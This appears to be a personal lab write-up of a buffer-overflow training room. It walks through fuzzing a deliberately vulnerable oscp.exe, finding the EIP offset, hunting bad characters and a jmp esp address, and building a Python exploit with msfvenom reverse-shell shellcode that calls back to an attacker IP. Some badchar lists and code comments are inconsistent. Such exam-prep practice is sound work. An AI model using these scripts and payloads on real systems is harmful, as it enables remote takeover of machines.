---
sticker: lucide//code
---
# Deploy VM

---

This room uses a 32-bit Windows 7 VM with Immunity Debugger and Putty preinstalled. Windows Firewall and Defender have both been disabled to make exploit writing easier.

You can log onto the machine using RDP with the following credentials:Â admin/password

I suggest using the xfreerdp command:Â `xfreerdp /u:admin /p:password /cert:ignore /v:10.10.200.9 /workarea /tls-seclevel:0   `

If Windows prompts you to choose a location for your network, choose the "Home" option.

On your Desktop there should be a folder called "vulnerable-apps". Inside this folder are a number of binaries which are vulnerable to simple stack based buffer overflows (the type taught on the PWK/OSCP course):

- The SLMail installer.
- The brainpan binary.
- The dostackbufferoverflowgood binary.
- The vulnserver binary.
- A custom written "oscp" binary which contains 10 buffer overflows, each with a different EIP offset and set of badchars.

I have also written a handy guide to exploiting buffer overflows with the help of mona:Â [https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)[](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)

Please note that this room does not teach buffer overflows from scratch. It is intended to help OSCP students and also bring to their attention some features of mona which will save time in the OSCP exam.

Thanks go toÂ [@Mojodojo_101](https://twitter.com/Mojodojo_101)Â for helping create the custom oscp.exe binary for this room!


# oscp.exe - OVERFLOW1

---

Right-click the Immunity Debugger icon on the Desktop and choose "Run as administrator".

When Immunity loads, click the open file icon, or choose File -> Open. Navigate to the vulnerable-apps folder on the admin user's desktop, and then the "oscp" folder. Select the "oscp" (oscp.exe) binary and click "Open".

The binary will open in a "paused" state, so click the red play icon or choose Debug -> Run. In a terminal window, the oscp.exe binary should be running, and tells us that it is listening on port 1337.

On your Kali box, connect to port 1337 on 10.10.200.9 using netcat:

`nc 10.10.199.216 1337`

Type "HELP" and press Enter. Note that there are 10 different OVERFLOW commands numbered 1 - 10. Type "OVERFLOW1 test" and press enter. The response should be "OVERFLOW1 COMPLETE". Terminate the connection.

Mona Configuration

The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:  

```
!mona config -set workingfolder c:\mona\%p
```

## Fuzzing

Create a file on your Kali box called fuzzer.py with the following contents:

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.199.216"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

Run the fuzzer.py script using python: `python3 fuzzer.py`

The fuzzer will send increasingly long strings comprised of As. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent.

## Crash Replication & Controlling EIP

ï»¿Create another file on your Kali box called exploit.py with the following contents:

```python
import socket

ip = "10.10.199.216"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server (change the `-l` value to this):

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600`  

If you are using the AttackBox, use the following path to `pattern_create.rb` instead (also ensure to change the `-l` value):

`/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 600`

Copy the output and place it into the payload variable of the exploit.py script.

On Windows, in Immunity Debugger, re-open the oscp.exe again using the same method as before, and click the red play icon to get it running. You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications).

On Kali, run the modified exploit.py script: `python3 exploit.py`

The script should crash the oscp.exe server again. This time, in Immunity Debugger, in the command input box at the bottom of the screen, run the following mona command, changing the distance to the same length as the pattern you created:

`!mona findmsp -distance 600`

Mona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view).

In this output you should see a line which states:

`EIP contains normal pattern : ... (offset XXXX)`

Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

## Finding Bad Characters

ï»¿Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).

`!mona bytearray -b "\x00"   `

Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from `\x0`1 to `\xff`:

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Update your exploit.py script and set the payload variable to the string of bad chars the script generates.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Make a note of the address to which the ESP register points and use it in the following mona command:

`!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`

A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.

The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.

## Finding a Jump Point  

With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):  

`!mona jmp -r esp -cpb "\x00"`

This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).

Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.  

## Generate Payload

Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):  

`msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c   `

Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:

## Prepend NOPs

Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

```
padding = "\x90" * 16
```

## Exploit!

With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell.

Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (4444 if you didn't change it).

Restart oscp.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!


## Practical

----

First, we need to run `Immunity Debugger` as admin:

![Pasted image 20250529120641.png](../../IMAGES/Pasted%20image%2020250529120641.png)

Once we run it as admin we need to open `oscp.exe` file located at the desktop of the administrator user:

![Pasted image 20250529120730.png](../../IMAGES/Pasted%20image%2020250529120730.png)

![Pasted image 20250529120742.png](../../IMAGES/Pasted%20image%2020250529120742.png)

As seen, the binary is in a paused state, we need to click the `red play button` to start it:

![Pasted image 20250529120831.png](../../IMAGES/Pasted%20image%2020250529120831.png)

The state has now changed to running, we can use netcat to verify it is listening:

![Pasted image 20250529120948.png](../../IMAGES/Pasted%20image%2020250529120948.png)

Everything's right for now, let's proceed, what we need to do now is configure mona, in Immunityâ€™s command bar (bottom), run:

```
!mona config -set workingfolder c:\mona\%p
```

![Pasted image 20250529121058.png](../../IMAGES/Pasted%20image%2020250529121058.png)

![Pasted image 20250529121115.png](../../IMAGES/Pasted%20image%2020250529121115.png)

Now, on our linux machine we need to create a file named `fuzzer.py` with this contents:

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.199.216"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

Let's run it now:

```
python3 fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing with 1700 bytes
Fuzzing with 1800 bytes
Fuzzing with 1900 bytes
Fuzzing with 2000 bytes
Fuzzing crashed at 2000 bytes
```

With that value, we can now create a pattern of a higher amount of bytes than the maximum, let's do this:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200 > pattern.txt
```

Now, we can create a `exploit.py` file:

```python
import socket

ip = "10.10.199.216"
port = 1337

prefix  = "OVERFLOW1 "
offset  = 0
overflow= ""
retn    = ""
padding = ""
payload = ""
postfix = ""

# Read the pattern file:
with open("pattern.txt","r") as f:
    payload = f.read().strip()

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
print("Sending test pattern...")
s.send(bytes(buffer + "\r\n", "latin-1"))
s.close()
```

Before we use the script, we need to restart `oscp.exe` on immunity debugger, simply open it again as before and press the red play button:

![Pasted image 20250529122103.png](../../IMAGES/Pasted%20image%2020250529122103.png)

Now, use the script:

```
python3 exploit.py

Sending test pattern...
```

If we did everything correctly, the oscp.exe file crashes, we now need to use mona again to find the EIP Offset:

```
!mona findmsp -distance 2200
```

Now if we take a closer look to the log panel we get in mona, we can see this:

![Pasted image 20250529122501.png](../../IMAGES/Pasted%20image%2020250529122501.png)

As seen, I got my offset:

```
1978
```

Knowing this, we now need to modify `exploit.py` again:

```python
import socket

ip = "10.10.199.216"
port = 1337

prefix  = "OVERFLOW1"
offset  = 1978
overflow= "A" * offset
retn    = "BBBB"
padding = ""
payload = ""
postfix = ""

# Read the pattern file:
with open("pattern.txt","r") as f:
    payload = f.read().strip()

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
print("Sending test pattern...")
s.send(bytes(buffer + "\r\n", "latin-1"))
s.close()

```

We need to restart `oscp.exe` again and run it:

![Pasted image 20250529123058.png](../../IMAGES/Pasted%20image%2020250529123058.png)

As seen, we got `Access Violation when executing [42424242]`, this means everything's going right by now, now, we need to use mona again to generate the base bytearray:

```
!mona bytearray -b "\x00"
```

![Pasted image 20250529123802.png](../../IMAGES/Pasted%20image%2020250529123802.png)


As seen, it got saved as `bytearray.bin`, we now need to create a bad char string on another python script:

```python
for x in range(1, 256):
    print("\\x{:02x}".format(x), end='')
print()
```

We can use:

```
python3 badchar.py > string.txt
```

Now, we need to copy that and remove the block that reads `pattern.txt`, it will go like this:

```python
import socket

ip = "10.10.199.216"
port = 1337

prefix  = "OVERFLOW1 "
offset  = 1978
overflow= "A" * offset
retn    = "BBBB"
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
print("Sending test pattern...")
s.send(bytes(buffer + "\r\n", "latin-1"))
s.close()
```


Now, restart the file again and use the script, the server will crash again and we need to look in the right side of immunity for the `ESP address`:

![Pasted image 20250529124609.png](../../IMAGES/Pasted%20image%2020250529124609.png)

There we go, our address is:

```
0x0018F430
```

Now, we can use mona;

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 0x0018F430
```

![Pasted image 20250529124830.png](../../IMAGES/Pasted%20image%2020250529124830.png)

Mona is telling us `\x01` is mangled in memory, we need to regenerate the bytearray excluding `\x00` and `\x01`:

```
!mona bytearray -b "\x00\x01"
```

On `exploit.py` we need to remove `\x01` too:

```python
import socket

ip = "10.10.199.216"
port = 1337

prefix  = "OVERFLOW1 "
offset  = 1978
overflow= "A" * offset
retn    = "BBBB"
padding = ""
payload = "\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
print("Sending test pattern...")
s.send(bytes(buffer + "\r\n", "latin-1"))
s.close()
```

Restart and compare again, we will get a new `esp` address, we need to check it up again and use mona:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 0x01A4FA30
```

![Pasted image 20250529125231.png](../../IMAGES/Pasted%20image%2020250529125231.png)

Got this, need to do the process all over again:

```
!mona bytearray -b "\x00\x01\x07\x08\x2e\x2f\xa0\xa1"
```

```python
import socket

ip = "10.10.199.216"
port = 1337

prefix  = "OVERFLOW1 "
offset  = 1978
overflow= "A" * offset
retn    = "BBBB"
padding = ""
payload = "\x02\x03\x04\x05\x06\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
print("Sending test pattern...")
s.send(bytes(buffer + "\r\n", "latin-1"))
s.close()

```

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 0x01CBFA30
```

![Pasted image 20250529125741.png](../../IMAGES/Pasted%20image%2020250529125741.png)

Finally, we got:

```
Hooray, normal shellcode unmodified
```

Means that the bad char hunting is over, we now need to proceed with finding the `jmp esp` gadget, we need to run:

```
!mona jmp -r esp -cpb "\x00\x01\x02\x07\x08\x20\x2e\x2f\xa0\xa1"
```

![Pasted image 20250529125932.png](../../IMAGES/Pasted%20image%2020250529125932.png)

As seen, we get some jmp esp gadgets, let's choose the first one:

```
0x625011AF
```

In our exploit, we need to change it too little-endian:

```python
retn = "\xaf\x11\x50\x62"
```

Now, we are approaching the end, we need to use `msfvenom` to generate the shellcode, let's do:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.14.21.28 LPORT=4444 EXITFUNC=thread -b "\x00\x01\x02\x07\x08\x20\x2e\x2f\xa0\xa1" -f c
```

We need to copy the output to our payload and add a NOP sled, here's the full script I got:

```python
#!/usr/bin/env python3

import socket

# Target configuration
ip      = "10.10.199.216"
port    = 1337

# Exploit parameters
prefix  = "OVERFLOW1 "          # Command prefix
offset  = 1978                   # offset to EIP
overflow= "A" * offset          # filler to reach EIP
# Return address: jmp esp in essfunc.dll (0x625011AF) little-endian
retn    = "\xaf\x11\x50\x62"
# NOP sled
padding = "\x90" * 32

# Shellcode (Generate with msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c)
payload = (
    b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
    b"\x0e\xb6\xd6\x8d\xcd\x83\xee\xfc\xe2\xf4\x4a\x3e\x0f\xcd"
    b"\xb6\xd6\xed\x44\x53\xe7\x4d\xa9\x3d\x86\xbd\x46\xe4\xda"
    b"\x06\x9f\xa2\x5d\xff\xe5\xb9\x61\xc7\xeb\x87\x29\x21\xf1"
    b"\xd7\xaa\x8f\xe1\x96\x17\x42\xc0\xb7\x11\x6f\x3f\xe4\x81"
    b"\x06\x9f\xa6\x5d\xc7\xf1\x3d\x9a\x9c\xb5\x55\x9e\x8c\x1c"
    b"\xe7\x5d\xd4\xed\xb7\x05\x06\x84\xae\x35\xb7\x84\x3d\xe2"
    b"\x06\xcc\x60\xe7\x72\x61\x77\x19\x80\xcc\x71\xee\x6d\xb8"
    b"\x40\xd5\xf0\x35\x8d\xab\xa9\xb8\x52\x8e\x06\x95\x92\xd7"
    b"\x5e\xab\x3d\xda\xc6\x46\xee\xca\x8c\x1e\x3d\xd2\x06\xcc"
    b"\x66\x5f\xc9\xe9\x92\x8d\xd6\xac\xef\x8c\xdc\x32\x56\x89"
    b"\xd2\x97\x3d\xc4\x66\x40\xeb\xbe\xbe\xff\xb6\xd6\xe5\xba"
    b"\xc5\xe4\xd2\x99\xde\x9a\xfa\xeb\xb1\x29\x58\x75\x26\xd7"
    b"\x8d\xcd\x9f\x12\xd9\x9d\xde\xff\x0d\xa6\xb6\x29\x58\x9d"
    b"\xe6\x86\xdd\x8d\xe6\x96\xdd\xa5\x5c\xd9\x52\x2d\x49\x03"
    b"\x1a\xa7\xb3\xbe\x87\xc3\xa3\xca\xe5\xcf\xb6\xc7\xd1\x44"
    b"\x50\xbc\x9d\x9b\xe1\xbe\x14\x68\xc2\xb7\x72\x18\x33\x16"
    b"\xf9\xc1\x49\x98\x85\xb8\x5a\xbe\x7d\x78\x14\x80\x72\x18"
    b"\xde\xb5\xe0\xa9\xb6\x5f\x6e\x9a\xe1\x81\xbc\x3b\xdc\xc4"
    b"\xd4\x9b\x54\x2b\xeb\x0a\xf2\xf2\xb1\xcc\xb7\x5b\xc9\xe9"
    b"\xa6\x10\x8d\x89\xe2\x86\xdb\x9b\xe0\x90\xdb\x83\xe0\x80"
    b"\xde\x9b\xde\xaf\x41\xf2\x30\x29\x58\x44\x56\x98\xdb\x8b"
    b"\x49\xe6\xe5\xc5\x31\xcb\xed\x32\x63\x6d\x6d\xd0\x9c\xdc"
    b"\xe5\x6b\x23\x6b\x10\x32\x63\xea\x8b\xb1\xbc\x56\x76\x2d"
    b"\xc3\xd3\x36\x8a\xa5\xa4\xe2\xa7\xb6\x85\x72\x18"
)
postfix = ""

# Build and send the buffer
buffer = prefix + overflow + retn + padding + payload.decode('latin-1') + postfix

print(f"[+] Connecting to {ip}:{port}...")
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip, port))
    print(f"[+] Sending {len(buffer)} bytes payload...")
    s.send(buffer.encode('latin-1') + b"\r\n")
    print("[+] Payload sent.")

print("[+] Done. Check your listener for a shell!")
```

We need to restart it and send the exploit:

![Pasted image 20250529131124.png](../../IMAGES/Pasted%20image%2020250529131124.png)

If we got our listener ready, we will receive the connection:

![Pasted image 20250529131143.png](../../IMAGES/Pasted%20image%2020250529131143.png)

We can now answer the questions:

![Pasted image 20250529131224.png](../../IMAGES/Pasted%20image%2020250529131224.png)


From now on, since the process is pretty much the same, you guys can practice by trying to get a reverse shell in every single `OVERFLOW`. If you got any problem, check the answers below.

# oscp.exe - OVERFLOW2

---


![Pasted image 20250529132544.png](../../IMAGES/Pasted%20image%2020250529132544.png)


# oscp.exe - OVERFLOW3

---

![Pasted image 20250529132558.png](../../IMAGES/Pasted%20image%2020250529132558.png)

# oscp.exe - OVERFLOW4

---

![Pasted image 20250529132609.png](../../IMAGES/Pasted%20image%2020250529132609.png)

# oscp.exe - OVERFLOW5

---

![Pasted image 20250529132623.png](../../IMAGES/Pasted%20image%2020250529132623.png)

# oscp.exe - OVERFLOW6

---

![Pasted image 20250529132634.png](../../IMAGES/Pasted%20image%2020250529132634.png)

# oscp.exe - OVERFLOW7

---

![Pasted image 20250529132645.png](../../IMAGES/Pasted%20image%2020250529132645.png)

# oscp.exe - OVERFLOW8

---

![Pasted image 20250529132704.png](../../IMAGES/Pasted%20image%2020250529132704.png)


# oscp.exe - OVERFLOW9

---

![Pasted image 20250529132725.png](../../IMAGES/Pasted%20image%2020250529132725.png)

# oscp.exe - OVERFLOW10

---

![Pasted image 20250529132736.png](../../IMAGES/Pasted%20image%2020250529132736.png)




![Pasted image 20250529132524.png](../../IMAGES/Pasted%20image%2020250529132524.png)

